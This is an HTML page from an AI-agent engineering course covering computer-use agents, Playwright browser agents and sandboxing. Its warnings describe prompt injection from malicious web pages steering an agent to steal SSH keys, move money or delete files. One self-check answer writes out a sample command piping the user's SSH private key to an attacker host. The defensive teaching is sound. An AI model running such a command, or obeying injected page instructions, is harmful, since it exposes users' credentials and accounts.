@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Agent Engineer Roadmap · 5.8 Computer Use &amp; App SDKs · by Harish Mondepu</title>
+<meta name="description" content="Agents with eyes and a mouse — Anthropic Computer Use, OpenAI Operator, Playwright browser automation, and sandboxing requirements for GUI-controlling agents."/>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<link href="https://fonts.googleapis.com/css2?family=Inter+Tight:ital,wght@0,300;0,400;0,500;0,600;0,700;1,400&family=Instrument+Serif:ital@0;1&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="module-styles.css"/>
+<style>
+:root{--phase:#059669;--phase-hi:#10b981;--phase-soft:rgba(16,185,129,.1);--phase-text:#059669}
+[data-theme="dark"]{--phase:#10b981;--phase-hi:#34d399;--phase-soft:rgba(16,185,129,.1);--phase-text:#a7f3d0}
+</style>
+</head>
+<body>
+
+<header class="nav">
+  <a class="nav__brand" href="../../index.html"><span class="nav__brand-dot"></span>Agent Engineer</a>
+  <span class="nav__sep">/</span>
+  <span class="nav__crumb">Phase 5 · <strong>Computer Use &amp; App SDKs</strong></span>
+  <div class="nav__right">
+    <span class="nav__progress">module 37 / 62</span>
+    <div class="nav__search" role="button" tabindex="0">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="7"/><path d="m21 21-4.35-4.35"/></svg>
+      Search <kbd class="nav__kbd">⌘K</kbd>
+    </div>
+    <button class="theme-toggle" onclick="toggleTheme()" aria-label="Toggle theme">
+      <span class="theme-toggle__icon" id="themeIcon">☾</span>
+      <span id="themeLabel">Dark</span>
+    </button>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar" aria-label="Course navigation">
+    <div class="sidebar__phase">
+      <button class="sidebar__phase-btn" style="opacity:.65">
+        <span class="sidebar__phase-indicator" style="background:#1aada0"></span>
+        Phase 1 · Python Foundations ✓
+      </button>
+    </div>
+    <div class="sidebar__phase">
+      <button class="sidebar__phase-btn" style="opacity:.65">
+        <span class="sidebar__phase-indicator" style="background:#06b6d4"></span>
+        Phase 2 · LLM Mental Model ✓
+      </button>
+    </div>
+    <div class="sidebar__phase">
+      <button class="sidebar__phase-btn" style="opacity:.65">
+        <span class="sidebar__phase-indicator" style="background:#a78bfa"></span>
+        Phase 3 · Prompt Engineering ✓
+      </button>
+    </div>
+    <div class="sidebar__phase">
+      <button class="sidebar__phase-btn" style="opacity:.65">
+        <span class="sidebar__phase-indicator" style="background:#f06292"></span>
+        Phase 4 · RAG + Evaluation ✓
+      </button>
+    </div>
+    <div class="sidebar__phase">
+      <button class="sidebar__phase-btn" data-active="true" style="color:var(--phase-text)">
+        <span class="sidebar__phase-indicator" style="background:var(--phase-hi)"></span>
+        Phase 5 · Tools, MCP &amp; Agents ✓
+      </button>
+      <div class="sidebar__modules">
+        <a class="sidebar__mod done" href="module-5-1.html"><span class="sidebar__mod-num">5.1</span>Function Calling<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-2.html"><span class="sidebar__mod-num">5.2</span>Tool Design Principles<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-3.html"><span class="sidebar__mod-num">5.3</span>MCP Protocol<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-4.html"><span class="sidebar__mod-num">5.4</span>The ReAct Pattern<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-5.html"><span class="sidebar__mod-num">5.5</span>LangChain Agents<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-6.html"><span class="sidebar__mod-num">5.6</span>Human in the Loop<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod done" href="module-5-7.html"><span class="sidebar__mod-num">5.7</span>Tool Security<span class="sidebar__check">✓</span></a>
+        <a class="sidebar__mod active" href="#"><span class="sidebar__mod-num">5.8</span>Computer Use &amp; App SDKs<span class="sidebar__check">✓</span></a>
+      </div>
+    </div>
+  </nav>
+
+  <main class="content" id="main">
+    <div class="phase-bar"></div>
+    <div class="mod-head">
+      <div class="mod-head__tags">
+        <span class="tag tag--phase">Phase 05</span>
+        <span class="tag tag--level">Advanced</span>
+        <span class="tag tag--week">Week 16</span>
+      </div>
+      <h1 class="mod-head__title">Computer Use &amp; <em>App SDKs</em></h1>
+      <p class="mod-head__sub">All previous modules gave agents access to APIs — structured interfaces designed for machines. But most of the software world doesn't have an API: legacy systems, desktop apps, consumer web apps. Computer use agents operate at the UI layer — taking screenshots, clicking buttons, typing text — to interact with any application regardless of whether it has an API. This module covers Anthropic Computer Use, OpenAI Operator, Playwright-based browser automation, and the sandboxing requirements that make these agents safe to deploy.</p>
+      <div class="mod-head__meta">
+        <span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>~24 min read</span>
+        <span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polygon points="23 7 16 12 23 17 23 7"/><rect x="1" y="5" width="15" height="14" rx="2"/></svg>1 video · 1 recording script</span>
+        <span><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>3 code examples</span>
+        <span>Last updated 2026-05-07</span>
+      </div>
+    </div>
+
+    <div class="body">
+      <div class="takeaways reveal">
+        <div class="takeaways__label">Key Takeaways</div>
+        <ul class="takeaways__list">
+          <li>Computer use agents interact at the UI layer — they see screenshots and issue mouse/keyboard actions, enabling automation of any application regardless of API availability</li>
+          <li>Anthropic Computer Use provides three tools: <code>computer</code> (screenshots + actions), <code>text_editor</code> (file read/write), <code>bash</code> (shell commands) — these are the most powerful and most dangerous tools in this course</li>
+          <li>Always run computer use agents in a sandboxed environment (Docker container, VM, isolated browser profile) — an unsandboxed computer use agent has access to your entire filesystem, credentials, and local services</li>
+          <li>Playwright + LLM agents (browser-use, Stagehand) are a lighter-weight alternative for web-specific tasks — no desktop access, lower risk, easier to sandbox</li>
+          <li>The "are you sure?" gate is mandatory — every irreversible action (file deletion, form submission, payment) must be confirmed before execution</li>
+        </ul>
+      </div>
+
+      <div class="meta-grid reveal">
+        <div class="meta-card meta-card--prereq">
+          <div class="meta-card__label">Prerequisites</div>
+          <ul class="meta-list">
+            <li><div class="meta-list__dot">!</div>Modules 5.1–5.7 — tool calling and agent security</li>
+            <li><div class="meta-list__dot">!</div><code>pip install anthropic playwright</code></li>
+            <li><div class="meta-list__dot">!</div>Docker (for sandboxed computer use)</li>
+          </ul>
+        </div>
+        <div class="meta-card meta-card--outcomes">
+          <div class="meta-card__label">Learning Outcomes</div>
+          <ul class="meta-list">
+            <li><div class="meta-list__dot">1</div>Explain the computer use architecture and its three tools</li>
+            <li><div class="meta-list__dot">2</div>Build a Playwright browser automation agent</li>
+            <li><div class="meta-list__dot">3</div>Identify sandboxing requirements for computer use agents</li>
+            <li><div class="meta-list__dot">4</div>Decide when to use computer use vs API integration</li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="video-block reveal">
+        <div class="video-block__header">
+          <div class="video-block__title">Anthropic Computer Use — Building Agents That Can See and Click</div>
+          <div class="video-block__source">
+            <span class="yt-badge"><svg width="10" height="10" viewBox="0 0 24 24" fill="currentColor"><path d="M21.6 7.2a2.7 2.7 0 0 0-1.9-1.9C18 5 12 5 12 5s-6 0-7.7.3a2.7 2.7 0 0 0-1.9 1.9C2 8.9 2 12 2 12s0 3.1.4 4.8a2.7 2.7 0 0 0 1.9 1.9C6 19 12 19 12 19s6 0 7.7-.3a2.7 2.7 0 0 0 1.9-1.9C22 15.1 22 12 22 12s0-3.1-.4-4.8ZM10 15V9l5.2 3L10 15Z"/></svg>YouTube</span>
+            <span>· search "Anthropic computer use agent tutorial Claude 2024"</span>
+          </div>
+        </div>
+        <div class="video-wrap">
+          <iframe src="https://www.youtube.com/embed/ODaHJzOyVCQ" title="Computer Use" allow="accelerometer;autoplay;clipboard-write;encrypted-media;gyroscope;picture-in-picture" allowfullscreen loading="lazy"></iframe>
+        </div>
+        <div class="video-caption">▶ Anthropic Computer Use demo — agent navigating a desktop and browser using screenshots and actions</div>
+      </div>
+
+      <div class="prose">
+
+        <h2 id="what-is-computer-use">What is computer use? <a class="anchor" href="#what-is-computer-use">#</a></h2>
+        <p>Standard tool-calling agents interact with programmatic APIs — structured interfaces that return JSON. Computer use agents interact with visual interfaces — they take a screenshot, understand what's on screen, issue a click or keystroke, take another screenshot to verify the result, and repeat. This pattern works for any application regardless of whether it has an API: a 30-year-old legacy desktop app, a web application behind authentication, a government portal with no developer access.</p>
+
+        <div class="diagram-block reveal" style="margin:1.5rem 0;background:var(--surface-1);border:1px solid var(--border);border-radius:10px;padding:1.4rem">
+          <div style="font-size:11px;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:.06em;margin-bottom:1rem">Computer use loop</div>
+          <div style="display:flex;flex-direction:column;gap:.4rem;font-size:13px">
+            <div style="display:grid;grid-template-columns:120px 1fr;gap:.75rem;padding:.6rem;background:var(--surface-0);border-radius:6px">
+              <div style="font-weight:700;color:var(--phase-text)">Screenshot</div>
+              <div>Agent takes a screenshot of the current screen state — this is the "observation" in the ReAct loop.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:120px 1fr;gap:.75rem;padding:.6rem;background:var(--surface-0);border-radius:6px">
+              <div style="font-weight:700;color:var(--phase-text)">Reason</div>
+              <div>Model analyses the screenshot, identifies UI elements, and decides what action to take next.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:120px 1fr;gap:.75rem;padding:.6rem;background:var(--surface-0);border-radius:6px">
+              <div style="font-weight:700;color:var(--phase-text)">Act</div>
+              <div>Model issues an action: <code>click(x=450, y=230)</code>, <code>type("hello")</code>, <code>key("Return")</code>, <code>scroll(direction="down")</code>.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:120px 1fr;gap:.75rem;padding:.6rem;background:var(--surface-0);border-radius:6px">
+              <div style="font-weight:700;color:var(--phase-text)">Verify</div>
+              <div>Take another screenshot to confirm the action had the expected effect — then repeat.</div>
+            </div>
+          </div>
+        </div>
+
+        <h2 id="anthropic-computer-use">Anthropic Computer Use API <a class="anchor" href="#anthropic-computer-use">#</a></h2>
+        <p>Claude's computer use tools are built into the Anthropic API. Three tools: <code>computer</code> (screenshots + mouse/keyboard actions), <code>text_editor</code> (read/write files), <code>bash</code> (run shell commands). These tools give the model full desktop control — use only in a sandboxed environment.</p>
+
+        <div class="code-wrap reveal">
+          <div class="code-head"><span><span class="code-lang">python</span><span class="code-file">computer_use.py — minimal computer use loop with Anthropic API</span></span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="kw">import</span> anthropic, base64, subprocess
+<span class="kw">from</span> PIL <span class="kw">import</span> ImageGrab  <span class="cm"># pip install Pillow</span>
+
+client = anthropic.<span class="fn">Anthropic</span>()
+
+<span class="kw">def</span> <span class="fn">take_screenshot</span>() -> <span class="tp">str</span>:
+    <span class="st">"""Capture screen and return as base64 PNG."""</span>
+    img = ImageGrab.<span class="fn">grab</span>()
+    img = img.<span class="fn">resize</span>((<span class="nm">1280</span>, <span class="nm">800</span>))  <span class="cm"># resize to reduce token cost</span>
+    <span class="kw">import</span> io
+    buf = io.<span class="fn">BytesIO</span>()
+    img.<span class="fn">save</span>(buf, format=<span class="st">"PNG"</span>)
+    <span class="kw">return</span> base64.<span class="fn">b64encode</span>(buf.<span class="fn">getvalue</span>()).<span class="fn">decode</span>()
+
+<span class="kw">def</span> <span class="fn">execute_action</span>(action: <span class="tp">dict</span>) -> <span class="tp">str</span>:
+    <span class="st">"""Execute a computer use action — in production this runs in a sandbox."""</span>
+    action_type = action.<span class="fn">get</span>(<span class="st">"action"</span>)
+    <span class="kw">if</span> action_type == <span class="st">"screenshot"</span>:
+        <span class="kw">return</span> <span class="fn">take_screenshot</span>()
+    <span class="kw">elif</span> action_type == <span class="st">"left_click"</span>:
+        x, y = action[<span class="st">"coordinate"</span>]
+        subprocess.<span class="fn">run</span>([<span class="st">"xdotool"</span>, <span class="st">"mousemove"</span>, <span class="tp">str</span>(x), <span class="tp">str</span>(y), <span class="st">"click"</span>, <span class="st">"1"</span>])
+        <span class="kw">return</span> <span class="st">"Clicked"</span>
+    <span class="kw">elif</span> action_type == <span class="st">"type"</span>:
+        subprocess.<span class="fn">run</span>([<span class="st">"xdotool"</span>, <span class="st">"type"</span>, action[<span class="st">"text"</span>]])
+        <span class="kw">return</span> <span class="st">"Typed"</span>
+    <span class="kw">return</span> <span class="st">f"Unknown action: {action_type}"</span>
+
+<span class="kw">def</span> <span class="fn">computer_use_loop</span>(task: <span class="tp">str</span>, max_steps: <span class="tp">int</span> = <span class="nm">10</span>):
+    screenshot_b64 = <span class="fn">take_screenshot</span>()
+    messages = [{
+        <span class="st">"role"</span>: <span class="st">"user"</span>,
+        <span class="st">"content"</span>: [
+            {<span class="st">"type"</span>: <span class="st">"image"</span>, <span class="st">"source"</span>: {<span class="st">"type"</span>: <span class="st">"base64"</span>, <span class="st">"media_type"</span>: <span class="st">"image/png"</span>, <span class="st">"data"</span>: screenshot_b64}},
+            {<span class="st">"type"</span>: <span class="st">"text"</span>, <span class="st">"text"</span>: task},
+        ],
+    }]
+
+    <span class="kw">for</span> _ <span class="kw">in</span> <span class="fn">range</span>(max_steps):
+        response = client.messages.<span class="fn">create</span>(
+            model=<span class="st">"claude-sonnet-4-6"</span>,
+            max_tokens=<span class="nm">4096</span>,
+            tools=[{<span class="st">"type"</span>: <span class="st">"computer_20241022"</span>, <span class="st">"name"</span>: <span class="st">"computer"</span>, <span class="st">"display_width_px"</span>: <span class="nm">1280</span>, <span class="st">"display_height_px"</span>: <span class="nm">800</span>}],
+            messages=messages,
+        )
+
+        <span class="kw">if</span> response.stop_reason == <span class="st">"end_turn"</span>:
+            <span class="kw">return</span> response.content[<span class="nm">0</span>].text
+
+        <span class="cm"># Process tool use blocks</span>
+        messages.<span class="fn">append</span>({<span class="st">"role"</span>: <span class="st">"assistant"</span>, <span class="st">"content"</span>: response.content})
+        tool_results = []
+        <span class="kw">for</span> block <span class="kw">in</span> response.content:
+            <span class="kw">if</span> block.<span class="fn">type</span> == <span class="st">"tool_use"</span>:
+                result = <span class="fn">execute_action</span>(block.<span class="fn">input</span>)
+                tool_results.<span class="fn">append</span>({
+                    <span class="st">"type"</span>: <span class="st">"tool_result"</span>,
+                    <span class="st">"tool_use_id"</span>: block.id,
+                    <span class="st">"content"</span>: [{<span class="st">"type"</span>: <span class="st">"image"</span>, <span class="st">"source"</span>: {<span class="st">"type"</span>: <span class="st">"base64"</span>, <span class="st">"media_type"</span>: <span class="st">"image/png"</span>, <span class="st">"data"</span>: <span class="fn">take_screenshot</span>()}}]
+                    <span class="kw">if</span> block.<span class="fn">input</span>.<span class="fn">get</span>(<span class="st">"action"</span>) == <span class="st">"screenshot"</span>
+                    <span class="kw">else</span> [{<span class="st">"type"</span>: <span class="st">"text"</span>, <span class="st">"text"</span>: result}],
+                })
+        messages.<span class="fn">append</span>({<span class="st">"role"</span>: <span class="st">"user"</span>, <span class="st">"content"</span>: tool_results})</code></pre>
+        </div>
+
+        <div class="callout callout--err">
+          <span class="callout__icon">🔴</span>
+          <div>
+            <strong class="callout__title">Never run computer use on your host machine without sandboxing</strong>
+            An unsandboxed computer use agent has access to your entire desktop: browser sessions (including saved passwords and authenticated cookies), local files, shell, and any applications running. A single prompt injection via a malicious web page could instruct the agent to exfiltrate SSH keys, transfer funds from an open banking tab, or delete critical files. Always run in an isolated Docker container with a virtual display (VNC/Xvfb), clean browser profile, no access to host filesystem or credentials, and a network allowlist limiting which domains the agent can visit.
+          </div>
+        </div>
+
+        <h2 id="playwright-agents">Playwright + LLM browser agents <a class="anchor" href="#playwright-agents">#</a></h2>
+        <p>For web-only tasks, Playwright-based agents are a lighter-weight, lower-risk alternative to full desktop computer use. The agent controls a browser via Playwright's API rather than mouse coordinates — it can access the DOM directly, which is more reliable than pixel-based clicking. Libraries like <code>browser-use</code> and <code>Stagehand</code> wrap Playwright with LLM integration.</p>
+
+        <div class="code-wrap reveal">
+          <div class="code-head"><span><span class="code-lang">python</span><span class="code-file">playwright_agent.py — LLM-guided browser automation</span></span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+          <pre><code><span class="cm"># pip install browser-use playwright</span>
+<span class="cm"># playwright install chromium</span>
+
+<span class="kw">import</span> asyncio
+<span class="kw">from</span> browser_use <span class="kw">import</span> Agent
+<span class="kw">from</span> langchain_openai <span class="kw">import</span> ChatOpenAI
+
+<span class="kw">async def</span> <span class="fn">main</span>():
+    agent = <span class="fn">Agent</span>(
+        task=<span class="st">"Go to news.ycombinator.com and return the titles of the top 5 posts."</span>,
+        llm=<span class="fn">ChatOpenAI</span>(model=<span class="st">"gpt-4o-mini"</span>),
+        <span class="cm"># browser_use handles Playwright setup, screenshot extraction, DOM parsing</span>
+    )
+    result = <span class="kw">await</span> agent.<span class="fn">run</span>()
+    <span class="fn">print</span>(result)
+
+asyncio.<span class="fn">run</span>(<span class="fn">main</span>())
+
+<span class="cm"># ── browser-use security defaults ────────────────────────────────────</span>
+<span class="cm"># Always configure an allowlist of permitted domains:</span>
+<span class="cm"># agent = Agent(task=..., llm=...,</span>
+<span class="cm">#     browser_config=BrowserConfig(allowed_domains=["example.com", "api.example.com"]))</span>
+<span class="cm">#</span>
+<span class="cm"># Headless mode for production (no visible browser window):</span>
+<span class="cm"># browser_config=BrowserConfig(headless=True)</span></code></pre>
+        </div>
+
+        <h2 id="when-to-use">When to use computer use vs API integration <a class="anchor" href="#when-to-use">#</a></h2>
+
+        <div class="diagram-block reveal" style="margin:1.5rem 0;background:var(--surface-1);border:1px solid var(--border);border-radius:10px;padding:1.4rem">
+          <div style="font-size:11px;font-weight:700;color:var(--fg-dim);text-transform:uppercase;letter-spacing:.06em;margin-bottom:.8rem">Computer use vs API integration</div>
+          <div style="display:flex;flex-direction:column;gap:.5rem;font-size:13px">
+            <div style="display:grid;grid-template-columns:220px 120px 1fr;gap:1rem;padding:.6rem;background:var(--surface-0);border-radius:6px;align-items:start">
+              <div style="font-weight:600;color:var(--fg)">Modern SaaS with public API</div>
+              <div style="font-weight:700;color:#10b981">Use API</div>
+              <div style="color:var(--fg-dim)">Faster, cheaper, more reliable. No visual fragility. APIs are designed for automation.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:220px 120px 1fr;gap:1rem;padding:.6rem;background:var(--surface-0);border-radius:6px;align-items:start">
+              <div style="font-weight:600;color:var(--fg)">Legacy desktop app with no API</div>
+              <div style="font-weight:700;color:var(--phase-text)">Computer use</div>
+              <div style="color:var(--fg-dim)">The only option for GUI-only software. Run in an isolated VM.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:220px 120px 1fr;gap:1rem;padding:.6rem;background:var(--surface-0);border-radius:6px;align-items:start">
+              <div style="font-weight:600;color:var(--fg)">Web app, no API access granted</div>
+              <div style="font-weight:700;color:var(--phase-text)">Playwright agent</div>
+              <div style="color:var(--fg-dim)">DOM access more reliable than pixel clicking. Scope to specific allowed domains.</div>
+            </div>
+            <div style="display:grid;grid-template-columns:220px 120px 1fr;gap:1rem;padding:.6rem;background:var(--surface-0);border-radius:6px;align-items:start">
+              <div style="font-weight:600;color:var(--fg)">API exists but poorly documented</div>
+              <div style="font-weight:700;color:#10b981">Use API anyway</div>
+              <div style="color:var(--fg-dim)">Spend time reverse-engineering the API. Computer use is 10x more fragile than API calls.</div>
+            </div>
+          </div>
+        </div>
+
+        <div class="callout callout--tip">
+          <span class="callout__icon">💡</span>
+          <div>
+            <strong class="callout__title">Phase 5 complete — your agent has hands</strong>
+            You now have the full toolkit for single agents: function calling (5.1), tool design (5.2), MCP for universal tool connectivity (5.3), ReAct for multi-step reasoning (5.4), LangGraph for production scaffolding (5.5), human-in-the-loop for safe irreversible actions (5.6), security against prompt injection and runaway tools (5.7), and computer use for GUI automation (5.8). Phase 6 covers Memory and Context Engineering — how to give your agent persistent memory across sessions, how to manage growing context windows, and how to build agents that improve with use.
+          </div>
+        </div>
+
+      </div><!-- /prose -->
+
+      <details class="script-block reveal">
+        <summary>
+          <div class="script-icon">🎬</div>
+          <div>
+            <div style="font-size:14px;font-weight:600">Recording Script — Module 5.8: Computer Use &amp; App SDKs</div>
+            <div style="font-size:12px;font-weight:400;color:var(--fg-dim);margin-top:.15rem">~24 min · 3 live demos</div>
+          </div>
+          <span class="script-badge">SCRIPT</span>
+        </summary>
+        <div class="script-body">
+          <div class="script-line" style="font-size:11px;font-weight:700;color:var(--fg-faint);padding-bottom:.4rem"><span>TIMESTAMP</span><span>ACTION</span><span>NARRATION</span></div>
+          <div class="script-line"><span class="script-ts">0:00 – 5:00</span><span class="script-action">INTRO + DIAGRAM</span><span class="script-narration">"Every tool we've built so far needed an API. But most software in the enterprise world — legacy ERPs, government portals, old desktop apps — has no API. Computer use is the answer: the agent sees the screen, decides where to click, acts, sees the result, and repeats. It's the most powerful and most dangerous automation pattern in this course. Let me show you why the sandbox matters before I show you the code."</span></div>
+          <div class="script-line"><span class="script-ts">5:00 – 15:00</span><span class="script-action">LIVE CODE</span><span class="script-narration">Run computer_use.py in a Docker container with VNC. "The agent takes a screenshot — sees the Ubuntu desktop. I ask it to open a text editor and type a note. It takes a screenshot, identifies the terminal icon, issues a left_click at those coordinates, takes another screenshot to verify the terminal opened, then types 'gedit note.txt'. Watch — it moves the mouse, opens the editor, types the text. This is exactly how Anthropic's computer use demo works. Now try it unsandboxed on your host machine and you'll see why the red warning exists."</span></div>
+          <div class="script-line"><span class="script-ts">15:00 – 24:00</span><span class="script-action">LIVE CODE</span><span class="script-narration">Run playwright_agent.py. "browser-use wraps Playwright. The agent opens Hacker News, reads the DOM, extracts the titles — faster and more reliably than pixel-clicking because it has direct DOM access. Show the domain allowlist configuration: 'I restrict this agent to news.ycombinator.com only — it cannot navigate to any other domain even if it's manipulated by a malicious page.' Wrap up: the decision table — if an API exists, use it. Computer use is for when nothing else works, and always behind a sandbox and human-in-the-loop gate."</span></div>
+        </div>
+      </details>
+
+      <div class="prose">
+        <h2 id="self-check">Self-check <a class="anchor" href="#self-check">#</a></h2>
+      </div>
+
+      <div class="selfcheck reveal">
+        <details class="selfcheck__q">
+          <summary>Explain what "sandboxing" means for a computer use agent and what specific risks it mitigates. What components should a minimal sandbox include?</summary>
+          <div class="selfcheck__a">Sandboxing for a computer use agent means running the agent in an isolated environment where its actions cannot affect the host system or exfiltrate sensitive data. Without sandboxing, a computer use agent has access to the developer's full desktop: browser sessions with authenticated cookies (banking, email, cloud accounts), SSH keys and API credentials in filesystem paths, any running application, and the network. A prompt injection via a malicious web page could instruct the agent to open a terminal and execute <code>cat ~/.ssh/id_rsa | curl attacker.com</code>, or navigate to a banking app tab and initiate a transfer. A minimal sandbox includes: (1) Docker container or VM with a clean operating system, no access to host filesystem mounts; (2) virtual display (Xvfb or VNC) rather than the host screen; (3) a fresh, clean browser profile with no saved credentials or cookies; (4) a network egress allowlist — only specific approved domains are reachable; (5) no write access to persistent storage by default, only a temporary working directory; (6) resource limits (CPU, memory, disk) to prevent runaway processes. The sandbox should be disposable — destroy and recreate it for each agent task.</div>
+        </details>
+        <details class="selfcheck__q">
+          <summary>Your company uses a legacy desktop ERP system with no API. You're evaluating whether to build a computer use agent to automate data entry. What are the three biggest risks and how would you mitigate each?</summary>
+          <div class="selfcheck__a">Risk 1 — UI fragility: Computer use agents identify elements by visual position and appearance. ERP vendors update their UI frequently, and even small layout changes (a button moved 20px, a menu item renamed) can cause the agent to click the wrong element or fail entirely. Mitigation: build comprehensive screenshot comparison tests; monitor the agent's actions after each ERP update; have a human-in-the-loop fallback for sessions where the agent detects unexpected UI state. Risk 2 — Data entry errors without verification: The agent types text into forms and submits them — if it misreads the source data or hits the wrong field, it enters wrong data into the ERP. Mitigation: after each form submission, have the agent take a screenshot and verify the entered values match the source before confirming; add a human review step for any submission above a value threshold. Risk 3 — Credential exposure: The ERP agent must log in with credentials. If the agent is sandboxed but the ERP session is live, a prompt injection could instruct the agent to navigate to sensitive screens and screenshot data. Mitigation: use the most restricted ERP user role possible (data entry only, no read access to sensitive modules), rotate credentials per session, and log all screenshots for audit. The overall recommendation: if the ERP has any export/import API, even a basic CSV import, use that instead — it's orders of magnitude more reliable than visual automation.</div>
+        </details>
+        <details class="selfcheck__q">
+          <summary>What is the advantage of Playwright-based browser agents over pixel-based computer use for web tasks, and what can computer use do that Playwright agents cannot?</summary>
+          <div class="selfcheck__a">Playwright-based browser agents have direct access to the page's DOM — they can query elements by selector, ID, or text content rather than relying on pixel coordinates from a screenshot. This makes them significantly more reliable for web tasks: a button at position (450, 230) in a screenshot may move to (450, 245) after a browser zoom change or minor CSS update, breaking the pixel-based agent. A Playwright agent querying by <code>button[type="submit"]</code> or <code>text="Sign in"</code> is unaffected by position changes. Playwright agents are also faster (no screenshot round-trip), cheaper (no image tokens), and easier to debug (Playwright logs record exact selectors used). What computer use can do that Playwright agents cannot: (1) interact with native desktop applications (file explorer, installed software, system dialogs); (2) interact with Canvas-rendered UIs that have no accessible DOM (some games, certain proprietary apps); (3) handle applications that detect and block automated browser access (some banking apps block headless Chrome); (4) interact with PDF forms or other non-HTML content in the browser. For pure web automation, Playwright is the better tool; for anything involving native desktop UI, computer use is the only option.</div>
+        </details>
+      </div>
+
+      <div class="next-mod reveal">
+        <div>
+          <div class="next-mod__label">Phase 5 complete · Up next</div>
+          <div class="next-mod__title">Phase 6 · Memory &amp; Context Engineering</div>
+          <p class="next-mod__desc">Giving your agent persistent memory across sessions. Conversation buffers, summary memory, semantic memory with vector stores, and managing context windows that grow beyond the model's limit.</p>
+        </div>
+        <a class="next-btn" href="module-6-1.html">Start Phase 6 →</a>
+      </div>
+
+      <div class="author reveal">
+        <div class="author__photo"><img src="https://portfolio-app-theta-one.vercel.app/harish-profile.jpg" alt="Harish Mondepu" onerror="this.parentElement.innerHTML='H';this.parentElement.style.cssText='display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:700;color:var(--phase-text)'" /></div>
+        <div>
+          <div class="author__name">Harish Mondepu</div>
+          <div class="author__title">Salesforce Engineer · AI Enthusiast</div>
+          <div class="author__bio">9+ years building production enterprise systems. 16× Salesforce certified. Building the AI engineering roadmap I wish had existed when I started.</div>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <aside class="toc" aria-label="On this page">
+    <div class="toc__label">On this page</div>
+    <a href="#what-is-computer-use">What is computer use?</a>
+    <a href="#anthropic-computer-use">Anthropic Computer Use API</a>
+    <a href="#playwright-agents">Playwright browser agents</a>
+    <a href="#when-to-use">Computer use vs API</a>
+    <a href="#self-check">Self-check</a>
+    <div class="toc__divider"></div>
+    <div class="toc__meta">Module 5.8 / 62<br/>Phase 5 · Week 16<br/>Author: Harish Mondepu<br/>Updated: 2026-05-07</div>
+  </aside>
+</div>
+
+<script>
+(function(){const s=localStorage.getItem('ae-theme');if(s)document.documentElement.dataset.theme=s})();
+function toggleTheme(){const h=document.documentElement;const n=h.dataset.theme==='dark'?'light':'dark';h.dataset.theme=n;localStorage.setItem('ae-theme',n);document.getElementById('themeIcon').textContent=n==='dark'?'☾':'☀';document.getElementById('themeLabel').textContent=n==='dark'?'Dark':'Light'}
+function copyCode(btn){const pre=btn.closest('.code-wrap').querySelector('pre');navigator.clipboard.writeText(pre.innerText).then(()=>{btn.textContent='✓ Copied';btn.classList.add('done');setTimeout(()=>{btn.textContent='Copy';btn.classList.remove('done')},2000)})}
+const io=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting)x.target.classList.add('in')}),{threshold:0.12,rootMargin:'0px 0px -6% 0px'});
+document.querySelectorAll('.reveal').forEach(el=>io.observe(el));
+const tocIO=new IntersectionObserver(e=>e.forEach(x=>{if(x.isIntersecting){document.querySelectorAll('.toc a').forEach(a=>a.classList.remove('active'));const a=document.querySelector(`.toc a[href="#${x.target.id}"]`);if(a)a.classList.add('active')}}),{rootMargin:'-20% 0px -70% 0px'});
+document.querySelectorAll('h2[id]').forEach(h=>tocIO.observe(h));
+</script>
+</body>
+</html>
